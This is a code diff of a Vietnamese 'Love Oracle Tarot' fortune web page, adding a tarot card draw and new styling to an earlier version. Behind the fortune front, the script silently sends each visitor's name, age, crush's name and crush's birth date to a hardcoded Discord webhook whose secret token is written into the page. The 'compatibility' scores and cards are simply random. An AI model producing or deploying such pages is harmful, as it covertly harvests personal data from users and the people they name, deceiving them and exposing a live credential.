@@ -2,89 +2,203 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Love Oracle 🔮</title>
+<title>Love Oracle Tarot 🔮</title>
 <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+
 <style>
-body{margin:0;font-family:Arial;background:linear-gradient(135deg,#ff5fa2,#ff9fcf);min-height:100vh;display:flex;align-items:center;justify-content:center}
-.card{background:white;width:420px;padding:25px;border-radius:20px;box-shadow:0 0 25px rgba(0,0,0,.2);text-align:center}
-h1{font-family:'Great Vibes',cursive;color:#ff4d88;font-size:40px}
-input,button{width:90%;padding:12px;margin:8px;border-radius:10px;border:1px solid #ddd}
-button{background:#ff4d88;color:white;border:none;font-size:16px}
-#loading{display:none}
-#resultBox{display:none}
-.tarot{font-size:50px}
+body{
+margin:0;font-family:'Arial';
+background:radial-gradient(circle at top,#ff9ad5,#ff3c8a,#2b0036);
+min-height:100vh;display:flex;align-items:center;justify-content:center;
+animation:bgmove 10s infinite alternate;
+}
+@keyframes bgmove{
+0%{background-position:0% 50%}
+100%{background-position:100% 50%}
+}
+.container{
+background:rgba(255,255,255,0.15);
+backdrop-filter:blur(12px);
+padding:30px;border-radius:25px;
+box-shadow:0 0 40px rgba(255,0,150,.6);
+width:420px;text-align:center;color:white;
+}
+h1{font-family:'Great Vibes';font-size:42px;margin-bottom:10px;text-shadow:0 0 15px #ff66c4}
+input,button{
+width:90%;padding:12px;margin:8px;border-radius:12px;border:none;
+}
+button{
+background:linear-gradient(45deg,#ff4fd8,#ff005c);
+color:white;font-size:16px;
+box-shadow:0 0 15px rgba(255,0,120,.8);
+transition:.3s;
+}
+button:hover{transform:scale(1.05)}
+.hidden{display:none}
+.loading{font-size:18px;animation:pulse 1.5s infinite}
+@keyframes pulse{0%{opacity:.3}50%{opacity:1}100%{opacity:.3}}
+
+.cards{display:flex;justify-content:space-around;margin-top:15px}
+.card{
+width:95px;height:150px;
+background:linear-gradient(135deg,#2b0036,#ff4fd8);
+border-radius:12px;
+box-shadow:0 0 20px rgba(255,0,150,.8);
+display:flex;align-items:center;justify-content:center;
+font-size:11px;padding:6px;
+animation:flip 1s ease;
+text-align:center;
+}
+@keyframes flip{
+0%{transform:rotateY(90deg)}
+100%{transform:rotateY(0deg)}
+}
+.reading{text-align:left;font-size:13px;margin-top:10px}
+.glow{animation:glow 2s infinite alternate}
+@keyframes glow{
+from{box-shadow:0 0 10px #ff66c4}
+to{box-shadow:0 0 30px #ff66c4}
+}
 </style>
 </head>
 
 <body>
-<div class="card">
+<div class="container glow">
 <h1>Love Oracle 🔮</h1>
 
 <div id="formBox">
-<input id="name" placeholder="Tên của bạn">
-<input id="dob" type="date">
-<input id="crush" placeholder="Tên người bạn thích">
-<button onclick="startFortune()">Xem Quẻ Tình Yêu</button>
+<input id="myName" placeholder="Tên của bạn">
+<input id="myAge" type="number" placeholder="Tuổi của bạn">
+<input id="crushName" placeholder="Tên crush">
+<input id="crushDob" type="date">
+<button onclick="startOracle()">Xem Quẻ</button>
 </div>
 
-<div id="loading">🔮 Đang giải quẻ tình yêu...</div>
+<div id="loading" class="loading hidden">🔮 Oracle đang kết nối năng lượng...</div>
 
-<div id="resultBox">
-<div class="tarot">💖</div>
-<h2 id="percent"></h2>
-<p id="message"></p>
-<button onclick="resetForm()">Xem Lại</button>
+<div id="resultBox" class="hidden">
+<h3 id="percentText"></h3>
+<p id="shortMsg"></p>
+<button onclick="drawTarot()">Trải Bài 3 Lá 🔮</button>
 </div>
+
+<div id="tarotBox" class="hidden">
+<h3>🔮 Trải Bài Tarot 3 Lá</h3>
+<div class="cards" id="cards"></div>
+<div class="reading" id="reading"></div>
+<button onclick="resetAll()">Xem Lại</button>
+</div>
+
 </div>
 
 <script>
+/* ================= WEBHOOK ================= */
 const webhook = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P";
 
-function startFortune(){
- const name=document.getElementById('name').value;
- const dob=document.getElementById('dob').value;
- const crush=document.getElementById('crush').value;
- if(!name||!dob||!crush){alert('Nhập đầy đủ thông tin');return}
+/* ================= TAROT DATA ================= */
+const tarotPositive=[
+"The Lovers","The Sun","The Star","The Empress","The World","Temperance","Strength"
+];
+const tarotNeutral=[
+"The Magician","The High Priestess","Wheel of Fortune","Justice","The Chariot","The Hermit"
+];
+const tarotWarning=[
+"The Devil","The Tower","Death","The Moon","Judgement","The Fool"
+];
 
- document.getElementById('formBox').style.display='none';
- document.getElementById('loading').style.display='block';
+let percent=0;
+let saveInfo={};
 
- setTimeout(()=>{
-   const percent=Math.floor(Math.random()*40)+60;
-   const messages=[
-     'Hai bạn có liên kết định mệnh rất mạnh 💞',
-     'Có duyên tiền kiếp, rất dễ thành đôi 💍',
-     'Năng lượng tình cảm cực cao 🔥',
-     'Khả năng tiến xa rất lớn 💖'
-   ];
-   const msg=messages[Math.floor(Math.random()*messages.length)];
+/* ================= START ORACLE ================= */
+function startOracle(){
+const myName=document.getElementById("myName").value;
+const myAge=document.getElementById("myAge").value;
+const crushName=document.getElementById("crushName").value;
+const crushDob=document.getElementById("crushDob").value;
 
-   document.getElementById('loading').style.display='none';
-   document.getElementById('resultBox').style.display='block';
-   document.getElementById('percent').innerText=`Độ hợp nhau: ${percent}%`;
-   document.getElementById('message').innerText=msg;
+if(!myName||!myAge||!crushName||!crushDob){
+alert("Vui lòng nhập đầy đủ thông tin");
+return;
+}
 
-   const content = {
-  content: 
-`🔮 Love Oracle New Entry 💖
-👤 Tên: ${name}
-🎂 Ngày sinh: ${dob}
-💘 Crush: ${crush}
+document.getElementById("formBox").classList.add("hidden");
+document.getElementById("loading").classList.remove("hidden");
+
+setTimeout(()=>{
+percent=Math.floor(Math.random()*40)+50;
+
+document.getElementById("loading").classList.add("hidden");
+document.getElementById("resultBox").classList.remove("hidden");
+
+document.getElementById("percentText").innerText=`Độ hợp nhau: ${percent}%`;
+
+let msg="";
+if(percent>80) msg="Liên kết linh hồn mạnh mẽ 💞";
+else if(percent>65) msg="Duyên nghiệp – có tiềm năng phát triển 💖";
+else msg="Kết nối yếu – nhiều thử thách ⚠️";
+
+document.getElementById("shortMsg").innerText=msg;
+
+/* ===== SAVE DATA ===== */
+saveInfo={myName,myAge,crushName,crushDob,percent,time:new Date().toLocaleString()};
+
+/* ===== SEND TO DISCORD ===== */
+const content={
+content:
+`🔮 Love Oracle Tarot 💖
+👤 Tên: ${myName}
+🎂 Tuổi: ${myAge}
+💘 Crush: ${crushName}
+📅 Ngày sinh crush: ${crushDob}
 📊 Độ hợp: ${percent}%
 🕒 Thời gian: ${new Date().toLocaleString()}`
 };
 
 fetch(webhook,{
-  method:'POST',
-  headers:{'Content-Type':'application/json'},
-  body:JSON.stringify(content)
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify(content)
 });
- },2000);
+
+},2000);
 }
 
-function resetForm(){
- document.getElementById('resultBox').style.display='none';
- document.getElementById('formBox').style.display='block';
+/* ================= DRAW TAROT ================= */
+function drawTarot(){
+document.getElementById("resultBox").classList.add("hidden");
+document.getElementById("tarotBox").classList.remove("hidden");
+
+let pool=[];
+if(percent>80) pool=[...tarotPositive];
+else if(percent>65) pool=[...tarotNeutral,...tarotPositive];
+else pool=[...tarotWarning,...tarotNeutral];
+
+let cardsDraw=[];
+while(cardsDraw.length<3){
+let c=pool[Math.floor(Math.random()*pool.length)];
+if(!cardsDraw.includes(c)) cardsDraw.push(c);
+}
+
+const cardsDiv=document.getElementById("cards");
+cardsDiv.innerHTML="";
+
+cardsDraw.forEach(c=>{
+let div=document.createElement("div");
+div.className="card";
+div.innerText=c;
+cardsDiv.appendChild(div);
+});
+
+document.getElementById("reading").innerText=
+`🃏 Quá khứ: ${cardsDraw[0]} – Ảnh hưởng cảm xúc ban đầu.
+💞 Hiện tại: ${cardsDraw[1]} – Trạng thái kết nối hiện tại.
+🔮 Tương lai: ${cardsDraw[2]} – Hướng phát triển mối quan hệ.`;
+}
+
+/* ================= RESET ================= */
+function resetAll(){
+document.getElementById("tarotBox").classList.add("hidden");
+document.getElementById("formBox").classList.remove("hidden");
 }
 </script>
 
